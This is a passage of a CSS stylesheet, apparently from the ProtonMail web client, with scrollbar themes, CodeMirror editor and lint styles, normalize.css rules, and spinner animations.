        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .1)
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_buttonUp,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_buttonUp,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -112px -72px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_buttonDown,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_buttonDown,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -112px -92px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_buttonLeft,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_buttonLeft,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -120px -112px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_buttonRight,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_buttonRight,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -120px -128px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-2.mCSB_scrollTools .mCSB_draggerRail {
            background-color: transparent;
            border-color: #fff;
            border: 1px solid hsla(0, 0%, 100%, .2);
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_draggerRail {
            border-color: #000;
            border-color: rgba(0, 0, 0, .2)
        }

        .mCS-inset-3.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .6)
        }

        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .6)
        }

        .mCS-inset-3.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-inset-3.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-inset-3.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-inset-3.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .75)
        }

        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .85)
        }

        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .9)
        }

        .CodeMirror {
            font-family: monospace;
            height: 300px;
            color: #000;
            direction: ltr
        }

        .CodeMirror-lines {
            padding: 4px 0
        }

        .CodeMirror pre {
            padding: 0 4px
        }

        .CodeMirror-gutter-filler,
        .CodeMirror-scrollbar-filler {
            background-color: #fff
        }

        .CodeMirror-gutters {
            border-right: 1px solid #ddd;
            background-color: #f7f7f7;
            white-space: nowrap
        }

        .CodeMirror-linenumber {
            padding: 0 3px 0 5px;
            min-width: 20px;
            text-align: right;
            color: #999;
            white-space: nowrap
        }

        .CodeMirror-guttermarker {
            color: #000
        }

        .CodeMirror-guttermarker-subtle {
            color: #999
        }

        .CodeMirror-cursor {
            border-left: 1px solid #000;
            border-right: none;
            width: 0
        }

        .CodeMirror div.CodeMirror-secondarycursor {
            border-left: 1px solid silver
        }

        .cm-fat-cursor .CodeMirror-cursor {
            width: auto;
            border: 0 !important;
            background: #7e7
        }

        .cm-fat-cursor div.CodeMirror-cursors {
            z-index: 1
        }

        .cm-fat-cursor-mark {
            background-color: rgba(20, 255, 20, .5)
        }

        .cm-animate-fat-cursor,
        .cm-fat-cursor-mark {
            -webkit-animation: blink 1.06s steps(1) infinite;
            animation: blink 1.06s steps(1) infinite
        }

        .cm-animate-fat-cursor {
            width: auto;
            border: 0;
            background-color: #7e7
        }

        @-webkit-keyframes blink {
            50% {
                background-color: transparent
            }
        }

        @keyframes blink {
            50% {
                background-color: transparent
            }
        }

        .cm-tab {
            display: inline-block;
            text-decoration: inherit
        }

        .CodeMirror-rulers {
            position: absolute;
            left: 0;
            right: 0;
            top: -50px;
            bottom: -20px;
            overflow: hidden
        }

        .CodeMirror-ruler {
            border-left: 1px solid #ccc;
            top: 0;
            bottom: 0;
            position: absolute
        }

        .cm-s-default .cm-header {
            color: blue
        }

        .cm-s-default .cm-quote {
            color: #090
        }

        .cm-negative {
            color: #d44
        }

        .cm-positive {
            color: #292
        }

        .cm-header,
        .cm-strong {
            font-weight: 700
        }

        .cm-em {
            font-style: italic
        }

        .cm-link {
            text-decoration: underline
        }

        .cm-strikethrough {
            text-decoration: line-through
        }

        .cm-s-default .cm-keyword {
            color: #708
        }

        .cm-s-default .cm-atom {
            color: #219
        }

        .cm-s-default .cm-number {
            color: #164
        }

        .cm-s-default .cm-def {
            color: #00f
        }

        .cm-s-default .cm-variable-2 {
            color: #05a
        }

        .cm-s-default .cm-type,
        .cm-s-default .cm-variable-3 {
            color: #085
        }

        .cm-s-default .cm-comment {
            color: #a50
        }

        .cm-s-default .cm-string {
            color: #a11
        }

        .cm-s-default .cm-string-2 {
            color: #f50
        }

        .cm-s-default .cm-meta,
        .cm-s-default .cm-qualifier {
            color: #555
        }

        .cm-s-default .cm-builtin {
            color: #30a
        }

        .cm-s-default .cm-bracket {
            color: #997
        }

        .cm-s-default .cm-tag {
            color: #170
        }

        .cm-s-default .cm-attribute {
            color: #00c
        }

        .cm-s-default .cm-hr {
            color: #999
        }

        .cm-s-default .cm-link {
            color: #00c
        }

        .cm-invalidchar,
        .cm-s-default .cm-error {
            color: red
        }

        .CodeMirror-composing {
            border-bottom: 2px solid
        }

        div.CodeMirror span.CodeMirror-matchingbracket {
            color: #0b0
        }

        div.CodeMirror span.CodeMirror-nonmatchingbracket {
            color: #a22
        }

        .CodeMirror-matchingtag {
            background: rgba(255, 150, 0, .3)
        }

        .CodeMirror-activeline-background {
            background: #e8f2ff
        }

        .CodeMirror {
            position: relative;
            overflow: hidden;
            background: #fff
        }

        .CodeMirror-scroll {
            overflow: scroll !important;
            margin-bottom: -30px;
            margin-right: -30px;
            padding-bottom: 30px;
            height: 100%;
            outline: none;
            position: relative
        }

        .CodeMirror-sizer {
            position: relative;
            border-right: 30px solid transparent
        }

        .CodeMirror-gutter-filler,
        .CodeMirror-hscrollbar,
        .CodeMirror-scrollbar-filler,
        .CodeMirror-vscrollbar {
            position: absolute;
            z-index: 6;
            display: none
        }

        .CodeMirror-vscrollbar {
            right: 0;
            top: 0;
            overflow-x: hidden;
            overflow-y: scroll
        }

        .CodeMirror-hscrollbar {
            bottom: 0;
            left: 0;
            overflow-y: hidden;
            overflow-x: scroll
        }

        .CodeMirror-scrollbar-filler {
            right: 0;
            bottom: 0
        }

        .CodeMirror-gutter-filler {
            left: 0;
            bottom: 0
        }

        .CodeMirror-gutters {
            position: absolute;
            left: 0;
            top: 0;
            min-height: 100%;
            z-index: 3
        }

        .CodeMirror-gutter {
            white-space: normal;
            height: 100%;
            display: inline-block;
            vertical-align: top;
            margin-bottom: -30px
        }

        .CodeMirror-gutter-wrapper {
            position: absolute;
            z-index: 4;
            background: none !important;
            border: none !important
        }

        .CodeMirror-gutter-background {
            position: absolute;
            top: 0;
            bottom: 0;
            z-index: 4
        }

        .CodeMirror-gutter-elt {
            position: absolute;
            cursor: default;
            z-index: 4
        }

        .CodeMirror-gutter-wrapper ::selection {
            background-color: transparent
        }

        .CodeMirror-gutter-wrapper ::-moz-selection {
            background-color: transparent
        }

        .CodeMirror-lines {
            cursor: text;
            min-height: 1px
        }

        .CodeMirror pre {
            border-radius: 0;
            border-width: 0;
            background: transparent;
            font-family: inherit;
            font-size: inherit;
            margin: 0;
            white-space: pre;
            word-wrap: normal;
            line-height: inherit;
            color: inherit;
            z-index: 2;
            position: relative;
            overflow: visible;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-variant-ligatures: contextual;
            font-variant-ligatures: contextual
        }

        .CodeMirror-wrap pre {
            word-wrap: break-word;
            white-space: pre-wrap;
            word-break: normal
        }

        .CodeMirror-linebackground {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 0
        }

        .CodeMirror-linewidget {
            position: relative;
            z-index: 2;
            padding: .1px
        }

        .CodeMirror-rtl pre {
            direction: rtl
        }

        .CodeMirror-code {
            outline: none
        }

        .CodeMirror-gutter,
        .CodeMirror-gutters,
        .CodeMirror-linenumber,
        .CodeMirror-scroll,
        .CodeMirror-sizer {
            -webkit-box-sizing: content-box;
            box-sizing: content-box
        }

        .CodeMirror-measure {
            position: absolute;
            width: 100%;
            height: 0;
            overflow: hidden;
            visibility: hidden
        }

        .CodeMirror-cursor {
            position: absolute;
            pointer-events: none
        }

        .CodeMirror-measure pre {
            position: static
        }

        div.CodeMirror-cursors {
            visibility: hidden;
            position: relative;
            z-index: 3
        }

        .CodeMirror-focused div.CodeMirror-cursors,
        div.CodeMirror-dragcursors {
            visibility: visible
        }

        .CodeMirror-selected {
            background: #d9d9d9
        }

        .CodeMirror-focused .CodeMirror-selected {
            background: #d7d4f0
        }

        .CodeMirror-crosshair {
            cursor: crosshair
        }

        .CodeMirror-line::selection,
        .CodeMirror-line>span::selection,
        .CodeMirror-line>span>span::selection {
            background: #d7d4f0
        }

        .CodeMirror-line::-moz-selection,
        .CodeMirror-line>span::-moz-selection,
        .CodeMirror-line>span>span::-moz-selection {
            background: #d7d4f0
        }

        .cm-searching {
            background-color: #ffa;
            background-color: rgba(255, 255, 0, .4)
        }

        .cm-force-border {
            padding-right: .1px
        }

        @media print {
            .CodeMirror div.CodeMirror-cursors {
                visibility: hidden
            }
        }

        .cm-tab-wrap-hack:after {
            content: ""
        }

        span.CodeMirror-selectedtext {
            background: none
        }

        .CodeMirror-lint-markers {
            width: 16px
        }

        .CodeMirror-lint-tooltip {
            background-color: #ffd;
            border: 1px solid #000;
            border-radius: 4px 4px 4px 4px;
            color: #000;
            font-family: monospace;
            font-size: 10pt;
            overflow: hidden;
            padding: 2px 5px;
            position: fixed;
            white-space: pre;
            white-space: pre-wrap;
            z-index: 100;
            max-width: 600px;
            opacity: 0;
            transition: opacity .4s;
            -moz-transition: opacity .4s;
            -webkit-transition: opacity .4s;
            -o-transition: opacity .4s;
            -ms-transition: opacity .4s
        }

        .CodeMirror-lint-mark-error,
        .CodeMirror-lint-mark-warning {
            background-position: 0 100%;
            background-repeat: repeat-x
        }

        .CodeMirror-lint-mark-error {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAYAAAC09K7GAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9sJDw4cOCW1/KIAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAAHElEQVQI12NggIL/DAz/GdA5/xkY/qPKMDAwAADLZwf5rvm+LQAAAABJRU5ErkJggg==")
        }

        .CodeMirror-lint-mark-warning {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAYAAAC09K7GAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9sJFhQXEbhTg7YAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAAMklEQVQI12NkgIIvJ3QXMjAwdDN+OaEbysDA4MPAwNDNwMCwiOHLCd1zX07o6kBVGQEAKBANtobskNMAAAAASUVORK5CYII=")
        }

        .CodeMirror-lint-marker-error,
        .CodeMirror-lint-marker-warning {
            background-position: 50%;
            background-repeat: no-repeat;
            cursor: pointer;
            display: inline-block;
            height: 16px;
            width: 16px;
            vertical-align: middle;
            position: relative
        }

        .CodeMirror-lint-message-error,
        .CodeMirror-lint-message-warning {
            padding-left: 18px;
            background-position: 0 0;
            background-repeat: no-repeat
        }

        .CodeMirror-lint-marker-error,
        .CodeMirror-lint-message-error {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAHlBMVEW7AAC7AACxAAC7AAC7AAAAAAC4AAC5AAD///+7AAAUdclpAAAABnRSTlMXnORSiwCK0ZKSAAAATUlEQVR42mWPOQ7AQAgDuQLx/z8csYRmPRIFIwRGnosRrpamvkKi0FTIiMASR3hhKW+hAN6/tIWhu9PDWiTGNEkTtIOucA5Oyr9ckPgAWm0GPBog6v4AAAAASUVORK5CYII=")
        }

        .CodeMirror-lint-marker-warning,
        .CodeMirror-lint-message-warning {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAANlBMVEX/uwDvrwD/uwD/uwD/uwD/uwD/uwD/uwD/uwD6twD/uwAAAADurwD2tQD7uAD+ugAAAAD/uwDhmeTRAAAADHRSTlMJ8mN1EYcbmiixgACm7WbuAAAAVklEQVR42n3PUQqAIBBFUU1LLc3u/jdbOJoW1P08DA9Gba8+YWJ6gNJoNYIBzAA2chBth5kLmG9YUoG0NHAUwFXwO9LuBQL1giCQb8gC9Oro2vp5rncCIY8L8uEx5ZkAAAAASUVORK5CYII=")
        }

        .CodeMirror-lint-marker-multiple {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAMAAADzjKfhAAAACVBMVEUAAAAAAAC/v7914kyHAAAAAXRSTlMAQObYZgAAACNJREFUeNo1ioEJAAAIwmz/H90iFFSGJgFMe3gaLZ0od+9/AQZ0ADosbYraAAAAAElFTkSuQmCC");
            background-repeat: no-repeat;
            background-position: 100% 100%;
            width: 100%;
            height: 100%
        }

        /*! normalize.css v3.0.2 | MIT License | git.io/normalize */
        html {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        main,
        menu,
        nav,
        section,
        summary {
            display: block
        }

        audio,
        canvas,
        progress,
        video {
            display: inline-block;
            vertical-align: baseline
        }

        audio:not([controls]) {
            display: none;
            height: 0
        }

        [hidden],
        template {
            display: none
        }

        a {
            background-color: transparent
        }

        a:active,
        a:hover {
            outline: 0
        }

        abbr[title] {
            border-bottom: 1px dotted
        }

        b,
        strong {
            font-weight: 700
        }

        dfn {
            font-style: italic
        }

        h1 {
            font-size: 2em;
            margin: .67em 0
        }

        mark {
            background: #ff0;
            color: #000
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sup {
            top: -.5em
        }

        sub {
            bottom: -.25em
        }

        img {
            border: 0
        }

        svg:not(:root) {
            overflow: hidden
        }

        figure {
            margin: 1em 40px
        }

        hr {
            -webkit-box-sizing: content-box;
            box-sizing: content-box;
            height: 0
        }

        pre {
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font: inherit;
            margin: 0
        }

        button {
            overflow: visible
        }

        button,
        select {
            text-transform: none
        }

        button,
        html input[type=button],
        input[type=reset],
        input[type=submit] {
            -webkit-appearance: button;
            cursor: pointer
        }

        button[disabled],
        html input[disabled] {
            cursor: default
        }

        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }

        input {
            line-height: normal
        }

        input[type=checkbox],
        input[type=radio] {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0
        }

        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            height: auto
        }

        input[type=search] {
            -webkit-appearance: textfield;
            -webkit-box-sizing: content-box;
            box-sizing: content-box
        }

        input[type=search]::-webkit-search-cancel-button,
        input[type=search]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        fieldset {
            border: 1px solid silver;
            margin: 0 2px;
            padding: .35em .625em .75em
        }

        legend {
            border: 0;
            padding: 0
        }

        textarea {
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        optgroup {
            font-weight: 700
        }

        table {
            border-collapse: collapse;
            border-spacing: 0
        }

        td,
        th {
            padding: 0
        }

        input[style*="background-position: 98% 50%;"]~.togglePassword-btn-toggle,
        input[style*='background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=");']~.togglePassword-btn-toggle {
            display: none
        }

        .loader {
            display: block;
            max-width: 100%;
            margin: auto;
            width: 100px;
            height: auto
        }

        #exiting {
            position: fixed;
            left: 0;
            top: 0;
            right: 0;
            bottom: 0;
            background-color: #fff;
            z-index: 9999;
            display: none;
            text-align: center;
            color: #555;
            font-size: 90%
        }

        #exiting.show {
            display: block
        }

        #exiting .spinner.large {
            height: 10rem
        }

        #exiting .spinner.large .spinner1,
        #exiting .spinner.large .spinner2,
        #exiting .spinner.large .spinner3 {
            background-color: #9397cd
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .pm_fadeIn {
            opacity: 0;
            -webkit-animation: fadeIn ease-in 1;
            animation: fadeIn ease-in 1;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-duration: .15s;
            animation-duration: .15s
        }

        .spinner {
            position: relative
        }

        .spinner1,
        .spinner2,
        .spinner3 {
            padding: 1rem;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            content: "";
            display: block;
            position: absolute;
            top: 0;
            left: 50%;
            margin-top: 0;
            margin-left: -2.5em;
            width: 3rem;
            height: 3rem;
            -webkit-transform-style: preserve-3d;
            transform-style: preserve-3d;
            -webkit-transform-origin: 50%;
            transform-origin: 50%;
            -webkit-transform: rotateY(50%);
            transform: rotateY(50%);
            -webkit-perspective-origin: 50% 50%;
            perspective-origin: 50% 50%;
            -webkit-perspective: 3rem;
            perspective: 3rem;
            background-size: 3rem 3rem;
            -webkit-mask: url(assets/img/valence.svg) no-repeat 50% 50%;
            mask: url(assets/img/valence.svg) no-repeat 50% 50%;
            -webkit-mask-size: cover;
            mask-size: cover
        }

        .spinner.large {
            top: 2rem;
            margin-top: 0;
            width: auto;
            height: 10rem
        }

        .spinner.large .spinner1,
        .spinner.large .spinner2,
        .spinner.large .spinner3 {
            top: 1rem;
            margin: 0;
            margin-left: -3rem;
            width: 6rem;
            height: 6rem;
            -webkit-perspective: 6rem;
            perspective: 6rem;
            background-size: 6rem 6rem;
            background-color: #fff
        }

        .spinner1 {
            -webkit-transform: rotateX(135deg) rotateY(35deg) rotate(0);
            transform: rotateX(135deg) rotateY(35deg) rotate(0);
            -webkit-animation: 1.2s spin1 infinite linear reverse, .6s flash infinite linear;
            animation: 1.2s spin1 infinite linear reverse, .6s flash infinite linear
        }

        .spinner1,
        .spinner2 {
            background-color: #9397cd
        }

        .spinner2 {
            -webkit-transform: rotateX(-135deg) rotateY(35deg) rotate(0);
            transform: rotateX(-135deg) rotateY(35deg) rotate(0);
            -webkit-animation: 1.2s spin2 infinite linear, .6s flash infinite linear;
            animation: 1.2s spin2 infinite linear, .6s flash infinite linear
        }

        .spinner3 {
            -webkit-transform: rotateX(0) rotateY(0) rotate(0);
            transform: rotateX(0) rotateY(0) rotate(0);
            -webkit-animation: .9s spin3 infinite linear reverse, .9s flash1 infinite linear;
            animation: .9s spin3 infinite linear reverse, .9s flash1 infinite linear;
            background-color: #9397cd;
            display: none
        }

        @-webkit-keyframes spin1 {
            0% {
                -webkit-transform: rotateX(135deg) rotateY(35deg) rotate(0deg);
                transform: rotateX(135deg) rotateY(35deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(135deg) rotateY(35deg) rotate(1turn);
                transform: rotateX(135deg) rotateY(35deg) rotate(1turn)
            }
        }

        @keyframes spin1 {
            0% {
                -webkit-transform: rotateX(135deg) rotateY(35deg) rotate(0deg);
                transform: rotateX(135deg) rotateY(35deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(135deg) rotateY(35deg) rotate(1turn);
                transform: rotateX(135deg) rotateY(35deg) rotate(1turn)
            }
        }

        @-webkit-keyframes spin2 {
            0% {
                -webkit-transform: rotateX(-135deg) rotateY(35deg) rotate(0deg);
                transform: rotateX(-135deg) rotateY(35deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(-135deg) rotateY(35deg) rotate(1turn);
                transform: rotateX(-135deg) rotateY(35deg) rotate(1turn)
            }
        }

        @keyframes spin2 {
            0% {
                -webkit-transform: rotateX(-135deg) rotateY(35deg) rotate(0deg);
                transform: rotateX(-135deg) rotateY(35deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(-135deg) rotateY(35deg) rotate(1turn);
                transform: rotateX(-135deg) rotateY(35deg) rotate(1turn)
            }
        }

        @-webkit-keyframes spin3 {
            0% {
                -webkit-transform: rotateX(0) rotateY(0) rotate(0deg);
                transform: rotateX(0) rotateY(0) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(0) rotateY(0) rotate(1turn);
                transform: rotateX(0) rotateY(0) rotate(1turn)
            }
        }

        @keyframes spin3 {
            0% {
                -webkit-transform: rotateX(0) rotateY(0) rotate(0deg);
                transform: rotateX(0) rotateY(0) rotate(0deg)
            }

            to {
                -webkit-transform: rotateX(0) rotateY(0) rotate(1turn);
                transform: rotateX(0) rotateY(0) rotate(1turn)
            }
        }

        @-webkit-keyframes flash {
            0% {
                opacity: 1
            }

            50% {
                opacity: .5
            }

            to {
                opacity: 1
            }
        }

        @keyframes flash {
            0% {
                opacity: 1
            }

            50% {
                opacity: .5
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes flash1 {
            0% {
                opacity: .5
            }

            50% {
                opacity: .1
            }

            to {
                opacity: .5
            }
        }

        @keyframes flash1 {
            0% {
                opacity: .5
            }

            50% {
                opacity: .1
            }

            to {
                opacity: .5
            }
        }

        .spinMe {
            -webkit-animation: spin .5s infinite linear;
            animation: spin .5s infinite linear
        }

        @-webkit-keyframes spin {
            0% {
                -webkit-transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn)
            }
        }

        @keyframes spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        .pulsor {
            -webkit-animation: pusate 2s infinite alternate;
            -moz-animation: pusate 2s infinite alternate;
            -animation: pusate 2s infinite alternate
        }

        @-webkit-keyframes pusate {
            0% {
                background: rgba(0, 0, 0, .2)
            }

            to {
                background: #d32e26
            }
        }

        @keyframes pusate {
            0% {
                background: rgba(0, 0, 0, .2)
            }

            to {
                background: #d32e26
            }
        }

        @-webkit-keyframes load8 {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes load8 {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @-webkit-keyframes bouncedelay {

            0%,
            80%,
            to {
                -webkit-transform: scale(0)
            }

            40% {
                -webkit-transform: scale(1)
            }
        }

        @keyframes bouncedelay {

            0%,
            80%,
            to {
                -webkit-transform: scale(0);
                transform: scale(0)
            }

            40% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @-webkit-keyframes highlight {
            0% {
                background: #505061
            }

            to {
                background: none
            }
        }

        @keyframes highlight {
            0% {
                background: #505061
            }

            to {
                background: none
            }
        }

        body {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica Neue, Helvetica, sans-serif;
            color: #555;
            font-size: 14px;
            font-weight: 400
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            margin: 0;
            line-height: 1em
        }

        h1 {
            font-size: 24px
        }

        h2 {
            font-size: 22px
        }

        h3 {
            font-size: 20px
        }

        h4 {
            font-size: 16px
        }

        h5 {
            font-size: 14px
        }

        h5,
        h6 {
            font-weight: 700
        }

        h6 {
            font-size: 12px
        }

        button {
            font: inherit;
            color: inherit
        }

        button:active,
        button:focus {
            outline: none
        }

        body .pm_form textarea[readonly],
        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        code {
            font-family: monospace;
            color: #000;
            border-radius: 2px;
            max-width: 100%;
            line-height: 1.35rem;
            overflow: auto;
            word-break: break-all;
            white-space: normal;
            padding: 0 .5rem;
            background-color: rgba(0, 0, 0, .06)
        }

        p code {
            display: inline
        }

        p a {
            color: #9397cd
        }

        hr {
            border: 0;
            -webkit-box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            height: 1px;
            margin: 20px 0
        }

        kbd {
            padding: 0 .5rem;
            line-height: 1.5rem;
            height: 1.5rem;
            display: inline-block;
            color: #222;
            background-color: #f2f2f2;
            border-radius: 3px;
            -webkit-box-shadow: 0 0 0 #acb0bf, inset 0 0 0 1px #acb0bf;
            box-shadow: 0 0 0 #acb0bf, inset 0 0 0 1px #acb0bf
        }

        kbd,
        kbd kbd {
            font-size: 100%
        }

        kbd kbd {
            padding: 0;
            font-weight: 700;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        body .pm_form textarea[readonly],
        pre {
            white-space: pre-wrap;
            margin: 1rem 0;
            padding: 1rem;
            background: #f4f4f4;
            border: 1px solid #acb0bf;
            color: #333;
            border-radius: 2px;
            display: block;
            max-width: 100%;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            word-break: break-all;
            min-height: 0 !important
        }

        .line-through,
        .strike-through {
            text-decoration: line-through
        }

        .secure:not(.light) {
            background: #505061;
            background-size: cover
        }

        .secure:not(.light):before {
            position: absolute;
            content: "";
            left: 0;
            top: 0;
            width: 100vw;
            height: 100vh;
            z-index: -1;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        #pm_main {
            color: #555;
            border-radius: 0
        }

        #conversation-view .frame,
        #pm_main {
            background: #fff
        }

        .composer-container,
        .squire-container {
            background: #fff;
            color: #555
        }

        .ico-protonvpn {
            background-image: url(assets/img/protonvpn-ico.svg);
            background-size: 100% 100%
        }

        .ua-ie body.scroll {
            overflow-y: auto !important;
            -webkit-overflow-scrolling: touch
        }

        .ua-ie body #pm_thread {
            overflow-y: scroll
        }

        .ua-ie #pm_composer .composer {
            border: 1px solid #acb0bf
        }

        .ua-ios .angular-squire,
        .ua-ios .angular-squire-wrapper {
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        .ua-ios #pm_captcha {
            -webkit-overflow-scrolling: touch;
            overflow: auto !important
        }

        .ua-ios #pm_thread {
            position: relative
        }

        .ua-ios #pm_thread:before {
            position: absolute;
            display: block;
            content: "";
            height: calc(100% + 1px);
            width: 100%;
            z-index: -1
        }

        .ua-firefox.ua-desktop-linux .pm_button,
        .ua-firefox.ua-desktop-linux .pm_buttons a {
            overflow: hidden
        }

        .ua-windows_nt-6-1.ua_firefox .pm_labels label .close:before {
            line-height: 12px
        }

        .ua-mac_os_x.ua_firefox .pm_labels label,
        .ua-mac_os_x.ua_firefox .pm_labels label.closed:hover,
        .ua-windows_nt-6-1.ua_firefox .pm_labels label,
        .ua-windows_nt-6-1.ua_firefox .pm_labels label.closed:hover {
            line-height: 8px
        }

        .ua-mac_os_x.ua_firefox .summary .pm_tag,
        .ua-windows_nt-6-1.ua_firefox .summary .pm_tag {
            line-height: 18px
        }

        .ua-firefox button::-moz-focus-inner {
            padding: 0;
            border: 0
        }

        .ua-firefox #pm_composer .composer footer .pm_button,
        .ua-firefox .pm_button,
        .ua-firefox .pm_labels label,
        .ua-firefox .pm_labels label.closed:hover {
